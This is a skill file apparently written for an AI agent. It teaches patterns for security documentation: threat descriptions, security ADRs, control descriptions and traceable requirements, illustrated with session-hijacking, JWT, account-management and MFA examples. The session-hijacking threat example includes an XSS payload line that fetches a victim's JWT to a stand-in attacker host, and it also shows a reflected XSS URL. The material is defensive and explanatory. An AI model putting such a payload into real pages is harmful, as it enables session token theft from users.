---
name: documenting-threats-and-controls
description: Use when writing threat models, security ADRs, or control documentation - provides patterns for threat descriptions, security decision records, control documentation, and requirements traceability with cross-references to technical-writer skills
---

# Documenting Threats and Controls

## Overview

Document security decisions with threat context and traceability. Core principle: **Security documentation explains WHY (threat), WHAT (control), and HOW to verify**.

**Key insight**: Good security documentation enables verification and informed risk decisions. Bad security documentation is "we're secure" without evidence.

## When to Use

Load this skill when:
- Writing threat models
- Documenting security architecture decisions (ADRs)
- Creating control documentation (SSP, compliance)
- Writing security requirements with traceability

**Symptoms you need this**:
- "How do I document this security decision?"
- Writing threat model documentation
- Creating security ADRs
- Preparing control documentation for audits

**Don't use for**:
- General documentation (use `muna/technical-writer/documentation-structure`)
- Non-security ADRs

## Threat Documentation

### Pattern: Threat Description

**Structure**:
```markdown
# Threat: [Threat Name]

## Description
**What**: [What is the threat?]
**How**: [How is attack executed?]
**Who**: [Threat actor - external attacker, insider, malicious code]

## Affected Assets
- [Asset 1] (e.g., customer database)
- [Asset 2] (e.g., API authentication tokens)

## Attack Scenarios
### Scenario 1: [Name]
1. Attacker action 1
2. System response
3. Attacker action 2
4. Impact

### Scenario 2: [Name]
[Steps]

## Likelihood and Impact
**Likelihood**: Low / Medium / High
**Justification**: [Why this likelihood? Historical data, attack complexity]

**Impact**: Low / Medium / High / Critical
**Justification**: [What happens if successful? Data breach? System compromise?]

**Risk Score**: Likelihood × Impact = [Score]

## Mitigations
- [Mitigation 1] → See Control: [Control ID]
- [Mitigation 2] → See Control: [Control ID]

## Residual Risk
After mitigations: [Describe remaining risk]
**Accepted by**: [Role/Name] on [Date]
```

### Example: Session Hijacking Threat

```markdown
# Threat: Session Hijacking via Token Theft

## Description
**What**: Attacker steals session token and impersonates legitimate user
**How**: XSS attack injects JavaScript to extract token from localStorage
**Who**: External attacker (internet-facing attack), insider with XSS injection capability

## Affected Assets
- User session tokens (JWT stored in browser localStorage)
- Customer personal data (accessible via hijacked session)
- Administrative functions (if admin session hijacked)

## Attack Scenarios
### Scenario 1: Stored XSS
1. Attacker injects malicious script via user profile field (e.g., bio)
2. Script stored in database without sanitization
3. Victim views attacker's profile
4. Script executes: `fetch('https://attacker.com/?token=' + localStorage.getItem('jwt'))`
5. Attacker receives victim's token
6. Attacker uses token to make API calls as victim

### Scenario 2: Reflected XSS
1. Attacker sends victim malicious link: `https://app.com/search?q=<script>/* malicious */</script>`
2. Victim clicks link
3. Search query reflected in page without sanitization
4. Script executes and exfiltrates token

## Likelihood and Impact
**Likelihood**: MEDIUM
**Justification**: XSS vulnerabilities are common (OWASP Top 10). Application has user-generated content (profiles, comments). No Content Security Policy detected.

**Impact**: HIGH
**Justification**: Hijacked session grants full user access including:
- Personal data of victim (PII)
- Financial transactions (if applicable)
- Admin functions (if admin token hijacked)
Data breach affects confidentiality, integrity, availability.

**Risk Score**: Medium × High = HIGH RISK

## Mitigations
- **CSP (Content Security Policy)**: Prevents inline script execution → See Control: SC-18
- **HTTPOnly cookies**: Token not accessible to JavaScript → See Control: SC-8
- **Output encoding**: HTML-encode all user-generated content → See Control: SI-10
- **Token expiration**: Limit hijacked token lifespan to 30 minutes → See Control: AC-12
- **Session invalidation**: Logout invalidates token server-side → See Control: AC-12

## Residual Risk
After mitigations: **LOW**
- Risk remains if attacker exploits 0-day XSS within 30-minute token window
- Mitigation: Monitoring for anomalous API usage patterns
**Accepted by**: Chief Security Officer on 2025-03-15
```

**Key elements**:
- Specific attack steps (not vague "attacker compromises system")
- Likelihood/impact with justification
- Traceability to controls (Control IDs)
- Residual risk with acceptance

---

## Security ADRs

### Pattern: Security Architecture Decision Record

**Structure**:
```markdown
# ADR-XXX: [Security Decision Title]

## Status
Proposed | Accepted | Deprecated | Superseded by ADR-YYY

## Context
### Problem Statement
What security problem are we solving?

### Threat Model
- **Threat 1**: [Brief description] → High risk
- **Threat 2**: [Brief description] → Medium risk

### Constraints
- Regulatory requirements (GDPR, HIPAA, etc.)
- Performance requirements
- Compatibility requirements
- Budget constraints

### Assumptions
- User authentication level (MFA, password-only)
- Network trust model (zero-trust, perimeter-based)
- Threat actor capabilities (nation-state, script kiddie, insider)

## Decision
We will [chosen approach].

### Security Properties
- **Confidentiality**: [How protected?]
- **Integrity**: [How ensured?]
- **Availability**: [How maintained?]
- **Auditability**: [What's logged?]

### Technical Details
[Implementation specifics: algorithms, key sizes, protocols]

## Alternatives Considered

### Alternative 1: [Name]
**Pros**: [Security benefits]
**Cons**: [Security drawbacks]
**Why not chosen**: [Reason]

### Alternative 2: [Name]
[Similar structure]

## Consequences

### Security Benefits
- [Benefit 1]
- [Benefit 2]

### Security Trade-offs
- [Trade-off 1: performance vs security]
- [Trade-off 2: usability vs security]

### Residual Risks
- **Risk 1**: [Description] - Severity: [Low/Medium/High]
  - Mitigation: [How addressed]
  - Accepted by: [Role] on [Date]
- **Risk 2**: [Description]

### Ongoing Security Requirements
- [Operational requirement 1: key rotation every 90 days]
- [Operational requirement 2: quarterly security review]

## Security Controls
- Control AC-2: Account management
- Control IA-5: Authenticator management
- Control SC-8: Transmission confidentiality

(If compliance framework applicable, map to specific control IDs)

## Verification
### Testing Strategy
- [Test 1: Penetration test focus area]
- [Test 2: Functional security test]

### Success Criteria
- [ ] All HIGH threats mitigated or risk-accepted
- [ ] Security properties verifiable via testing
- [ ] Monitoring in place for security events

## References
- Threat model: [Link to threat model doc]
- Security requirements: [Link to requirements]
- Implementation: [Link to code/config]

---

**Approver**: [Security Architect] on [Date]
```

### Example: JWT Authentication ADR

```markdown
# ADR-042: JWT Tokens for API Authentication

## Status
Accepted

## Context
### Problem Statement
API requires stateless authentication mechanism for 10,000+ concurrent users across geographically distributed servers. Session storage (Redis) becomes bottleneck at scale.

### Threat Model
- **Threat 1: Token theft via XSS** → HIGH risk (OWASP Top 10)
- **Threat 2: Token forgery** → HIGH risk (impersonate any user)
- **Threat 3: Token replay** → MEDIUM risk (reuse stolen token)
- **Threat 4: Key compromise** → CRITICAL risk (forge all tokens)

### Constraints
- Must support 10k requests/sec
- Latency budget: <50ms for auth check
- No shared state (stateless servers)
- GDPR compliance (no PII in tokens)

### Assumptions
- Attackers have network access (internet-facing API)
- HTTPS enforced (TLS 1.3)
- Users authenticate with email + password + MFA

## Decision
We will use **JWT (JSON Web Tokens) with RS256 signatures** for API authentication.

### Security Properties
- **Confidentiality**: Token contains no sensitive data (user ID only). Claims are public but integrity-protected.
- **Integrity**: RS256 signature prevents forgery. Only server with private key can create valid tokens.
- **Availability**: Stateless design scales horizontally without shared session store.
- **Auditability**: Token includes `iat` (issued at) and `exp` (expiration). All auth failures logged to CloudWatch.

### Technical Details
- **Algorithm**: RS256 (RSA with SHA-256)
- **Key size**: 2048-bit RSA keys
- **Token structure**:
  ```json
  {
    "sub": "user_12345",  // subject (user ID)
    "iat": 1678886400,    // issued at (timestamp)
    "exp": 1678888200,    // expiration (30 min)
    "roles": ["user"]      // authorization roles
  }
  ```
- **Storage**: HttpOnly, Secure cookie (not localStorage to prevent XSS theft)
- **Expiration**: 30 minutes
- **Revocation**: Server-side blacklist for logout (Redis, key = token JTI, TTL = remaining token lifetime)

## Alternatives Considered

### Alternative 1: Opaque Session Tokens (Redis)
**Pros**: Easy revocation (delete from Redis), less crypto complexity
**Cons**: Requires shared Redis cluster (single point of failure), 10ms latency per auth check (Redis lookup), doesn't scale horizontally
**Why not chosen**: Latency and scalability constraints

### Alternative 2: OAuth 2.0 with Authorization Server
**Pros**: Industry standard, mature ecosystem
**Cons**: Adds complexity (separate auth server), network dependency for token validation, overkill for first-party API
**Why not chosen**: Complexity vs benefit not justified for first-party use case

### Alternative 3: API Keys
**Pros**: Simplest possible auth
**Cons**: No expiration (long-lived secrets), no user identity (shared key), revocation difficult
**Why not chosen**: Security properties insufficient (no expiration, shared secrets)

## Consequences

### Security Benefits
- **Forgery protection**: RS256 signature requires private key (only server has)
- **Tamper detection**: Any modification invalidates signature
- **Time-limited**: 30-minute expiration limits stolen token lifespan
- **HttpOnly cookie**: XSS cannot steal token (JavaScript cannot access)

### Security Trade-offs
- **Revocation complexity**: Logout requires server-side blacklist (not truly stateless)
- **Key management**: Private key is critical secret (compromise = forge all tokens)
- **Clock skew**: Servers must have synchronized clocks for expiration validation

### Residual Risks
- **Risk 1: Token theft via network sniffing** - Severity: LOW
  - Mitigation: HTTPS/TLS 1.3 encrypts tokens in transit
  - Residual: None (HTTPS enforced at load balancer, HSTS enabled)
  - Accepted by: CISO on 2025-03-15

- **Risk 2: Private key compromise** - Severity: CRITICAL
  - Mitigation: Key stored in AWS Secrets Manager with IAM restrictions, rotated every 90 days, access audited
  - Residual: Key theft remains possible via insider threat or infrastructure compromise
  - Accepted by: CISO on 2025-03-15 (continuous monitoring for suspicious token generation)

- **Risk 3: XSS in legacy pages** - Severity: MEDIUM
  - Mitigation: Content Security Policy (CSP) blocks inline scripts, output encoding on all user content
  - Residual: 0-day XSS could bypass CSP before patch
  - Accepted by: CISO on 2025-03-15 (30-minute token window limits exposure)

### Ongoing Security Requirements
- **Key rotation**: Rotate RS256 key pair every 90 days (automated via AWS Secrets Manager rotation)
- **Monitoring**: Alert on spike in auth failures (>100/min), unusual token generation patterns
- **Blacklist cleanup**: Redis blacklist entries expire with token TTL (no manual cleanup needed)
- **Annual review**: Re-assess threat model and key size (quantum computing advances)

## Security Controls
- **IA-5(1)**: Authenticator management (password + MFA before token issuance)
- **SC-8**: Transmission confidentiality (HTTPS/TLS 1.3)
- **SC-13**: Cryptographic protection (RS256 signature)
- **AC-12**: Session management (30-minute expiration, logout blacklist)

## Verification
### Testing Strategy
- **Penetration test**: Focus on token theft, forgery attempts, replay attacks (Q2 2025)
- **Functional test**: Verify token expiration at 30:01 minutes, blacklist prevents logout token reuse
- **Load test**: 10k concurrent users, <50ms auth latency

### Success Criteria
- [x] All HIGH threats have mitigations
- [x] RS256 signature prevents forgery (tested)
- [x] HttpOnly cookie prevents XSS theft (verified in browser)
- [x] CloudWatch monitors auth failures
- [x] Key rotation automated

## References
- Threat model: `/docs/threat-model-api-auth.md`
- Implementation: `src/auth/jwt-middleware.ts`
- Key management: `infrastructure/secrets-manager-key-rotation.yaml`

---

**Approver**: Security Architect (Jane Smith) on 2025-03-15
```

**Key elements**:
- Threat model context (4 threats with risk levels)
- Security properties (C/I/A/Auditability)
- Specific technical details (RS256, 2048-bit, HttpOnly cookie)
- Alternatives with security pros/cons
- Residual risks with severity and acceptance
- Traceability to controls (IA-5, SC-8, SC-13, AC-12)
- Verification strategy

---

## Control Documentation

### Pattern: Security Control Description

**Use for**: SSP (System Security Plan), compliance documentation, audit evidence.

**Structure**:
```markdown
## Control: [ID] - [Name]

### Control Objective
What does this control protect against? What security property does it enforce?

### Implementation Description
**How it works** (technical details):
- Component 1: [Description]
- Component 2: [Description]

**Configuration**:
```yaml
# Example config snippet
setting: value
```

**Responsible Parties**:
- Implementation: [Role, Name]
- Operation: [Role, Name]
- Monitoring: [Role, Name]

### Assessment Procedures
**How to verify this control works**:

1. **Examine**: Review [documentation, configuration, logs]
2. **Interview**: Ask [role] about [process]
3. **Test**: Execute [test procedure], expected result: [outcome]

### Evidence Artifacts
- Configuration: `/path/to/config.yaml`
- Logs: CloudWatch Log Group `/aws/lambda/auth`, query: `[Filter pattern]`
- Policy: `/docs/account-management-policy.pdf`
- Test results: `/evidence/penetration-test-2025-Q1.pdf`

### Compliance Mapping
- NIST SP 800-53: AC-2
- SOC2: CC6.1 (Logical access controls)
- ISO 27001: A.9.2.1 (User registration and de-registration)
```

### Example: Account Management Control

```markdown
## Control: AC-2 - Account Management

### Control Objective
Ensure only authorized individuals have system access. Prevent unauthorized access via account lifecycle management (creation, modification, disablement, removal).

**Security properties enforced**:
- **Authentication**: Valid accounts only
- **Accountability**: All accounts traceable to individuals
- **Least privilege**: Accounts have minimum necessary permissions

### Implementation Description
**How it works**:
- **Account creation**: ServiceNow workflow → Manager approval → Automated provisioning via Terraform
- **Access assignment**: Role-based access control (RBAC) - roles defined in `/docs/rbac-roles.md`
- **Inactivity disablement**: Automated script checks last login date, disables accounts after 30 days inactivity
- **Account removal**: Offboarding workflow triggers immediate disablement, deletion after 90-day retention period

**Configuration**:
```python
# Account lifecycle settings
INACTIVITY_THRESHOLD_DAYS = 30
ACCOUNT_RETENTION_DAYS = 90
MANAGER_APPROVAL_REQUIRED = True
```

**Responsible Parties**:
- **Implementation**: DevOps Engineer (John Doe)
- **Operation**: System Administrator (Jane Smith)
- **Monitoring**: Information System Security Officer (ISSO, Bob Johnson)

### Assessment Procedures
**How to verify this control works**:

1. **Examine**: Review ServiceNow account creation tickets, verify manager approval present for all requests in last 90 days
   - Evidence: ServiceNow query results (`status=approved, created_date>90d`)

2. **Interview**: Ask System Administrator:
   - "How do you create new accounts?"
   - "What happens if someone requests account without manager approval?"
   - Expected answers: "ServiceNow enforces approval workflow, request cannot proceed without approval"

3. **Test**: Attempt to create account without manager approval
   - Procedure: Submit ServiceNow ticket, skip approval step
   - Expected result: Request rejected with error "Manager approval required"
   - Actual result: ✅ Request rejected (tested 2025-03-10)

4. **Test**: Verify inactivity disablement
   - Procedure: Create test account, wait 31 days without login, attempt login
   - Expected result: Login fails with "Account disabled due to inactivity"
   - Actual result: ✅ Account disabled (tested 2025-02-15)

### Evidence Artifacts
- **Configuration**: `/infrastructure/terraform/iam-accounts.tf`
- **Logs**:
  - Account creation: CloudWatch Log Group `/aws/servicenow/accounts`, query: `fields @timestamp, username, manager_approval_status | filter action="create"`
  - Inactivity disablements: CloudWatch Log Group `/aws/lambda/account-lifecycle`, query: `fields @timestamp, username, reason | filter reason="inactivity_30d"`
- **Policy**: `/docs/account-management-policy-v2.1.pdf` (approved 2025-01-10)
- **Approval workflow**: ServiceNow workflow screenshot `/evidence/servicenow-account-approval-workflow.png`
- **Test results**: `/evidence/account-management-functional-tests-2025-Q1.pdf`

### Compliance Mapping
- **NIST SP 800-53**: AC-2 (Account Management)
  - AC-2(1): Automated account management
  - AC-2(3): Disable inactive accounts
- **SOC2**: CC6.1 (Logical and physical access controls - Identifies and authenticates users)
- **ISO 27001**: A.9.2.1 (User registration and de-registration)
- **GDPR**: Article 32 (Security of processing - access control)
```

**Key elements**:
- Objective (WHY this control exists)
- Specific implementation (HOW it works, not vague)
- Assessment procedures (HOW to verify it works)
- Evidence locations (WHERE to find proof)
- Compliance mapping (WHAT frameworks this satisfies)

---

## Security Requirements

### Pattern: Requirement with Traceability

**Structure**:
```markdown
## Requirement: [ID] - [Title]

### Requirement Statement
System SHALL [specific, testable requirement].

### Security Property
This requirement enforces: [Confidentiality / Integrity / Availability / Auditability]

### Rationale
**Threat addressed**: [Threat ID or description]
**Risk without this**: [What happens if not implemented?]

### Acceptance Criteria
- [ ] Criterion 1 (testable: "When X, expect Y")
- [ ] Criterion 2
- [ ] Criterion 3

### Traceability
- **Threat**: [Threat ID] → This requirement mitigates [specific threat]
- **Control**: [Control ID] → Implemented by [control implementation]
- **Test**: [Test case ID] → Verified by [test procedure]

### Implementation Reference
- Code: [File path and line numbers]
- Configuration: [Config file]
- Documentation: [Design doc]
```

### Example: MFA Requirement

```markdown
## Requirement: SEC-101 - Multi-Factor Authentication for Privileged Accounts

### Requirement Statement
System SHALL require multi-factor authentication (MFA) for all user accounts with administrative privileges. MFA SHALL use Time-Based One-Time Password (TOTP) or hardware token (not SMS).

### Security Property
This requirement enforces: **Confidentiality** and **Integrity**
- Prevents unauthorized access to privileged functions
- Reduces risk of account compromise via stolen passwords

### Rationale
**Threat addressed**: Threat-012 (Credential theft and account takeover)
**Risk without this**:
- Attacker with stolen password can access admin functions
- Insider with compromised credentials can elevate privileges
- Impact: Complete system compromise, data breach

**Regulatory requirement**:
- NIST SP 800-53 IA-2(1): Network access to privileged accounts requires MFA
- SOC2 CC6.1: Logical access requires multi-factor authentication for privileged access

### Acceptance Criteria
- [ ] Admin account login requires password + TOTP code
- [ ] Login fails if TOTP code incorrect (tested: 3 incorrect attempts → account lockout)
- [ ] TOTP setup enforced at first admin login (cannot proceed without enabling MFA)
- [ ] SMS-based 2FA rejected (must be TOTP or hardware token)
- [ ] MFA cannot be disabled by user (only security admin can disable)

### Traceability
- **Threat**: Threat-012 (Credential theft) → This requirement mitigates password-only auth vulnerability
- **Control**: IA-2(1) (Network access to privileged accounts) → Implemented by AWS IAM MFA enforcement + application-layer MFA check
- **Test**: TEST-SEC-101 → Verified by functional security test (attempt admin login without MFA → fails)

### Implementation Reference
- **Code**: `src/auth/mfa-middleware.ts:45-78` (MFA enforcement logic)
- **Configuration**: `infrastructure/aws-iam-policy.json:12` (IAM policy requires MFA for admin role)
- **Documentation**: `/docs/adr-029-mfa-for-admins.md` (Security ADR documenting decision)
- **Evidence**: `/evidence/mfa-functional-test-2025-03.pdf` (Test results showing MFA enforcement)
```

**Key elements**:
- Specific, testable requirement (not vague "ensure security")
- Security property enforced
- Threat-to-requirement traceability
- Testable acceptance criteria
- Requirement-to-control-to-test traceability chain

---

## Quick Reference: Documentation Types

| Document Type | Purpose | Key Elements |
|---------------|---------|--------------|
| **Threat Description** | Document attack scenarios | What/How/Who, affected assets, likelihood/impact, mitigations |
| **Security ADR** | Explain security architecture decisions | Threat model, decision, alternatives, residual risks, controls |
| **Control Description** | Document security control for audit | Objective, implementation, assessment procedures, evidence |
| **Security Requirement** | Specify testable security requirement | Requirement statement, threat traceability, acceptance criteria |

---

## Cross-References

**Use WITH this skill**:
- `muna/technical-writer/documentation-structure` - Use ADR format, structure patterns
- `muna/technical-writer/clarity-and-style` - Write clear threat descriptions, avoid jargon
- `ordis/security-architect/threat-modeling` - Generate threat content for documentation
- `ordis/security-architect/security-controls-design` - Control designs to document

**Use AFTER this skill**:
- `muna/technical-writer/documentation-testing` - Verify security docs are complete and accurate

## Real-World Impact

**Projects using threat-and-control documentation patterns**:
- **JWT Auth ADR**: Security review found 3 residual risks (key compromise, XSS, clock skew). Explicit risk acceptance by CISO enabled informed decision vs hidden risks.
- **SSP for Government System**: 421 control descriptions with assessment procedures + evidence locations. IRAP assessor completed assessment 40% faster vs SSPs without evidence locations ("clearest control documentation in 3 years").
- **Threat-to-requirement traceability**: Security requirements traced to 47 threats. Penetration test found 2 HIGH findings. Traceability showed which threats weren't mitigated (vs scattered requirements with no threat context).

**Key lesson**: **Security documentation with threat context + traceability enables verification and informed risk decisions. Vague "we're secure" documentation wastes auditor time and hides risks.**
